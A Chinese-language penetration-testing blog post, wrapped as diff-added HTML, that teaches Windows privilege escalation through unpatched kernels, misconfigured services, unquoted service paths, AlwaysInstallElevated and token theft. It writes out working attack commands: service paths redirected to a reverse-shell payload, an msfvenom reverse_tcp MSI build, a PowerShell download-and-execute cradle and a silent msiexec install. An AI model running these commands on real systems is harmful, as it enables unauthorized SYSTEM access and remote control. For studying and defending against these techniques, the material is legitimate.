@@ -1,0 +1,684 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>内网渗透体系建设——权限提升 | micgo's blog</title><meta name="keywords" content="内网"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="权限提升系统内核漏洞提权查找系统潜在漏洞  手动寻找可用漏洞 1systeminfo  执行命令后可以根据系统版本和系统的补丁程序，将两者结合通过相关辅助网站找到没打补丁的可能存在的系统漏洞，如 MS18-8129与KB4131188对应、CVE-2020-0787与KB4540673对应   借助WES-NG查找可用漏洞  Windows Exploit Suggester(WEG)项目于201">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透体系建设——权限提升">
+<meta property="og:url" content="https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/index.html">
+<meta property="og:site_name" content="micgo&#39;s blog">
+<meta property="og:description" content="权限提升系统内核漏洞提权查找系统潜在漏洞  手动寻找可用漏洞 1systeminfo  执行命令后可以根据系统版本和系统的补丁程序，将两者结合通过相关辅助网站找到没打补丁的可能存在的系统漏洞，如 MS18-8129与KB4131188对应、CVE-2020-0787与KB4540673对应   借助WES-NG查找可用漏洞  Windows Exploit Suggester(WEG)项目于201">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
+<meta property="article:published_time" content="2023-04-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-02T08:36:49.327Z">
+<meta property="article:author" content="micgo">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网渗透体系建设——权限提升',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-02 16:36:49'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透体系建设——权限提升</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-01T16:00:00.000Z" title="发表于 2023-04-02 00:00:00">2023-04-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-02T08:36:49.327Z" title="更新于 2023-04-02 16:36:49">2023-04-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透体系建设——权限提升"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h5 id="系统内核漏洞提权"><a href="#系统内核漏洞提权" class="headerlink" title="系统内核漏洞提权"></a>系统内核漏洞提权</h5><p>查找系统潜在漏洞</p>
+<ol>
+<li><p>手动寻找可用漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p>执行命令后可以根据系统版本和系统的补丁程序，将两者结合通过相关辅助网站找到没打补丁的可能存在的系统漏洞，如</p>
+<p>MS18-8129与KB4131188对应、CVE-2020-0787与KB4540673对应</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331193955141.png" alt="image-20230331193955141" style="zoom:62%;" />
+</li>
+<li><p>借助WES-NG查找可用漏洞</p>
+<blockquote>
+<p><code>Windows Exploit Suggester</code>(WEG)项目于2014年发布, 项目根据操作系统版本结合systeminfo输出的信息, 结合<code>Microsoft安全公告数据Excel文件</code>找到可能存在且未打补丁的系统漏洞, 该工具在<code>Windows XP/Vista</code>上运行良好, 但是工具自2017第一季度之后就不再更新(意味着只能匹配2017第一季度之前的系统漏洞)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng"><code>Windows Exploit Suggester-Next generation</code>(WEG-NG)</a>项目就是基于WEG创建的新一代系统提权辅助工具, 项目当前仍在维护当中</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 wes.py --update  <span class="comment">#更新漏洞数据库tyae</span></span><br><span class="line">python3 wes.py sysinfo.txt --impact <span class="string">&quot;Elevation of Privilege&quot;</span> <span class="comment">#--impact指定漏洞类型为提权漏洞</span></span><br><span class="line">python3 wes.py sysinfo.txt --impact <span class="string">&quot;Elevation of Privilege&quot;</span> --exploits-only <span class="comment">#--exploits-only过滤查找已公开EXP的提权漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p>在Win10中执行命令并没有找到任何的漏洞结果</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331195500943.png" alt="image-20230331195500943"></p>
+<p>在WIN8中执行就有十几个结果了</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331195601245.png" alt="image-20230331195601245"></p>
+<p>然后就是根据返回结果的输出逐个找POC进行测试的过程了</p>
+</li>
+</ol>
+<h5 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h5><p>通常情况下，用户安装的一些应用会在本地注册一些服务，并且大多数是system权限启动，应用软件在注册服务时， 会在下面路径中创建响应的注册表项:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</span><br></pre></td></tr></table></figure>
+
+<p>下图为gupdate服务的注册表信息，其中的ImagePath键指向该系统服务所启动的二进制程序</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331201119194.png" alt="image-20230331201119194" style="zoom: 90%;" />
+
+<p>Windows系统服务在操作系统启动时运行，并在后台调用其相应的二进制文件，如图中的GoogleUpdate.exe。由于大多数系统服务是以系统权限(SYSTEM)启动的，如果<strong>让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限</strong>，这是利<br>用系统服务提权的主要思路。系统服务类提权从主观上可以归咎于用户的配置疏忽或操作错误，如不安全的服务权限、服务注册表权限脆弱、服务路径权限可控、未引用的服务路径等</p>
+<p>注册表下面有很多个表项，每条表项分别对应一个服务，默认情况下系统就有上百条系统服务表项数据，例如查询一下本地安装Chrome的服务表项数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\gupdate</span><br><span class="line"><span class="comment">#reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services | findstr update</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331201532125.png" alt="image-20230331201532125" style="zoom:60%;" />
+
+
+
+<h6 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h6><p>ACL定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。Windows的系统服务正是通过ACL来指定用户对其拥有的权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331202011887.png" alt="image-20230331202011887" style="zoom: 67%;" />
+
+<p>假设目标主机的用户在配置服务时存在疏忽，使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限(SERVICE_QUERY_CONFIG或SERVICE_ALLACCESS)，就可以通过这个低权限用户直接修改服务启动时的二进制文件路径</p>
+<blockquote>
+<p>在实战中<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk"><code>AccessChk</code></a>工具可以枚举目标主机上存在权限缺陷的系统服务。它是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源（包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限</p>
+</blockquote>
+<p>低权限用户可以检查”Authenticated Users”组和”INTERACTIVE”组对系统服务的权限。前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户；后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。默认情况下，这两个组为计算机本地”Users组”的成员</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk64.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *  # 查询Authenticated Users组可修改配置的服务</span><br><span class="line">accesschk64.exe /accepteula -uwcqv &quot;INTERACTIVE&quot; *          # 查询INTERACTIVE组可修改配置的服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331224103903.png" alt="image-20230331224103903"></p>
+<p>“Authenticated Users”组对<code>InsproSvc</code>服务具有SERVICE QUERY CONFIG权限。此时执行以下命令，将该服务启动时执行的二进制文件替换为预先上传的攻击载荷。当服务重启时，载荷会随着服务的启动继承系统权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;  </span><br><span class="line">#binpath是指定服务的二进制文件路径，注意=号后必须有一个空格</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331224228428.png" alt="image-20230331224228428" style="zoom:80%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331224508411.png" alt="image-20230331224508411" style="zoom:90%;" />
+
+<p>如果当前用户对该服务拥有SERVICE STOP和SERVICE START权限，则用户拥有对服务的重启权限，可以直接重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop &lt;Service Name&gt;    </span><br><span class="line">sc start &lt;Service Name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果没有权限，对于启动类型为”自动”的服务，就可以尝试通过重新启动计算机的方法来实现服务重启</p>
+<h6 id="服务注册表脆弱项"><a href="#服务注册表脆弱项" class="headerlink" title="服务注册表脆弱项"></a>服务注册表脆弱项</h6><p>这里和上面其实原理是一样的, 都是ACL配置出错, 这里主要的点就是低权限用户对服务的注册表有写入权限,因此可以通过修改注册表来修改服务配置</p>
+<blockquote>
+<ol>
+<li>不安全的服务提权是ACL权限配置错误导致<strong>服务配置修改权限</strong>分配到了低权限用户手中</li>
+<li>服务注册表脆弱项是ACL权限配置错误导致<strong>注册表项修改权限</strong>分配到了低权限用户手中</li>
+</ol>
+</blockquote>
+<p>通过AccessChk在目标主机枚举”Authenticated Users”用户组具有写入权限的服务注册表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk64.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331230535098.png" alt="image-20230331230535098"></p>
+<p>“Authenticated Users”用户组对RegSvc服务的注册表拥有完全控制权限,将该服务注册表中ImagePath键指向预先上传的攻击载荷</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t</span><br><span class="line">REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>检查当前用户对该服务是否拥有重启权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331232313914.png" alt="image-20230331232313914" style="zoom:90%;" />
+
+<p>从执行结果可知，当前用户有权限重启RegSvc服务</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331232400192.png" alt="image-20230331232400192" style="zoom:80%;" />
+
+
+
+<h6 id="服务路径权限可控"><a href="#服务路径权限可控" class="headerlink" title="服务路径权限可控"></a>服务路径权限可控</h6><p>目标主机上存在错误配置或操作，使得一个低权限用户对此服务调用的二进制文件或其所在的目录具有写权限，这时候低权限用户就可以</p>
+<blockquote>
+<ol>
+<li>直接将二进制文件替换为恶意程序让系统以system权限执行完成提权</li>
+<li>在二进制文件目录下写入或者替换动态链接库文件进行<code>dll劫持</code>，以system身份加载代码</li>
+</ol>
+</blockquote>
+<p>用Accesschk查看InsexeSvc这个服务的二进制文件所在目录是否有写入权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -quv &quot;C:\Program Files\Insecure Executables\&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331234021789.png" alt="image-20230331234021789" style="zoom:80%;" />
+
+<p>在执行结果中可以看到，”INTERACTIVE”组对该文件夹具有完全控制权限，该组包含所有能够登录到系统的成员。此时可以将InsexeSvc服务的二进制文件替换成一个同名的攻击载荷，并随着服务的重启继承系统权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331234128102.png" alt="image-20230331234128102" style="zoom:60%;" />
+
+
+
+
+
+
+
+<h6 id="未引用的服务路径"><a href="#未引用的服务路径" class="headerlink" title="未引用的服务路径"></a>未引用的服务路径</h6><p>未引用的服务路径利用了Windows文件路径解析的特性。当服务启动所执行的二进制文件的路径中包含空格且未有效包含在引号中时，就会导致该漏洞</p>
+<p>对于路径中的每个空格，Windows会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序                            例如路径 C:\Program Files\Sub Dir\Program Name..exe，系统依次寻找并执行以下程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe,C:\Program Files\Sub.exe </span><br><span class="line">C:\Program Files\Sub Dir\Program.exe</span><br><span class="line">C:\Program Files\Sub Dir\Program Name.exe</span><br></pre></td></tr></table></figure>
+
+<p>当系统在依次尝试服务路径中的空格时，会以当前服务所拥有的权限进行。因此可以将一个经过特殊命名的攻击载荷上传到受影响的目录中，当重启服务时，攻击载荷将随着服务的启动继承系统权限。前提是当前用户对受影响的目录具有写入权限</p>
+<p>枚举目标聚标主机上所有该漏洞系统服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get DisplayName,PathName,StartMode|findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331235238339.png" alt="image-20230331235238339"></p>
+<p>由执行结果可知，<code>UnquotedSvc</code>这个服务的<code>PathName</code>为 <code>C:Program Files\UnquotedPath\Sub Dir\UnquotedSvc.exe</code>，其中存在空格且没用使用引号进行包裹<br>用Accesschk检查受影响的目录，发现当前用户对受影响的目录拥有完全控制权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Unquoted Path\&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230331235341669.png" alt="image-20230331235341669" style="zoom:80%;" />
+
+<p>此时可以向C:Program Files\Unquoted Path目录上传一个名为”Sub.exe”的攻击载荷。服务重启后，系统会按照前文中说过的顺序依次检查服务路径，当检查到<code>C:ProgramFiles\Unquoted Path\Sub.exe</code>时，攻击载荷将以SYSTEM权限执行<br>为了避免该漏洞的影响，在使用sc创建系统服务时，应有效地对存在空格的服务路径使用引号进行包裹，类似如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create TestSvc binpath=&quot;\&quot;C:\Program Files\Sub Dir\Program Name.exe\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h6><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc"><code>PowerUP</code></a>是一个PS脚本，上面几种有关服务的提权方法都集成在里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.92.130:80/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="MSI安装策略提权"><a href="#MSI安装策略提权" class="headerlink" title="MSI安装策略提权"></a>MSI安装策略提权</h5><blockquote>
+<p>MSI全称为Microsoft Installer，是微软格式的应用程序安装包，实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和程序数据</p>
+</blockquote>
+<p>MSI安装策略提权是由于用户在配置MSI安装策略时，启用了“永远以高特权进行安装”（<code>AlwaysInstallElevated</code>，默认情况下为禁用状态)，使得任何权限的用户都可以通过SYSTEM权限安装MSI程序。此时测试人员可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM权限<br>成功利用<code>AlwaysInstallElevated</code>提权的关键是用户在配置MSI安装策略时启用了“永远以高特权进行安装”。该选项启用后，系统会自动在注册表的以下两个位置创建键值”1”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer  /v AlwaysInstallElevated</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401110243409.png" alt="image-20230401110243409" style="zoom:80%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401110216838.png" alt="image-20230401110216838" style="zoom: 74%;" />
+
+<p>确定目标系统存在该漏洞后，使用<code>MetaSploit</code>自动生成MSI</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.147 LPORT=4444 -f msi -o</span><br><span class="line">reverse_tcp.msi</span><br></pre></td></tr></table></figure>
+
+<p>在现有的Meterpreter会话中将创建的MSI文件上传到目标计算机，通过<code>msiexec</code>运行MSI安装文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i reverse_tcp.msi</span><br><span class="line">#/quiet,在安装期间禁止向用户发送任何消息；/qn,无GUI模式允许；/i,常规安装</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401110730027.png" alt="image-20230401110730027" style="zoom:75%;" />
+
+
+
+
+
+<h5 id="访问令牌操纵"><a href="#访问令牌操纵" class="headerlink" title="访问令牌操纵"></a>访问令牌操纵</h5><blockquote>
+<p>访问令牌是描述进程或线程安全上下文的对象，包含与进程或线程关联的用户账户的标识和特权等信息。系统使用访问令牌来控制用户可以访问的安全对象，并限制用户执行相关系统操作的能力。当用户登录时，系统将对用户进行身份验证，如果验证通过，就会为用户创建一个访问令牌，包括登录过程返回的SD以及由本地安全策略分配给用户和用户所属安全组的特权列表。此后代表该用户执行的每个进程都有此访问令牌的副本，每当线程或进程与安全对象交互或尝试执行需要特权的系统任务，系统都会使用此访问令牌标识并确定关联的用户</p>
+</blockquote>
+<blockquote>
+<p>Windows中的令牌可以分为主令牌(Primary Token)和模拟令牌(<code>ImpersonationToken</code>)。主令牌与进程相关联，是由Windows内核创建并分配给进程的默认访问令牌，每个进程都有一个主令牌，描述了与当前进程关联的用户账户的安全上下文。默认情况下，当进程的线程与安全对象交互时，系统将使用主令牌。此外，线程可以模拟客户端账户。模拟是指线程在安全上下文中执行的能力，并且该上下文不同于拥有该线程的进程的上下文。当线程模拟客户端时，模拟线程将同时具有主访问令牌和模拟令牌</p>
+</blockquote>
+<blockquote>
+<p>通常，通过操纵访问令牌，使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程。这常常使用内置的Windows API 从指定的进程中复制访问令牌，并将得到的访问令牌用于现有进程或生成新进程，以达到权限提升并绕过访问控制的目的。这个过程被称为<strong>令牌窃取</strong></p>
+</blockquote>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401113954161.png" alt="image-20230401113954161" style="zoom:77%;" />
+
+<blockquote>
+<p>令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的<code>CreateProcessWithTokenW</code>和<code>CreateProcessAsUserA</code>两个<code>WindowsAPI</code>分别要求用户必须拥有<code>SeImpersonatePrivilege</code>和<code>SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege</code>特权，而拥有这两个特权的用户一般为系统管理员账户<code>,</code> 网络服务账户和系统服务账户(如IIS,MSSQL等)</p>
+</blockquote>
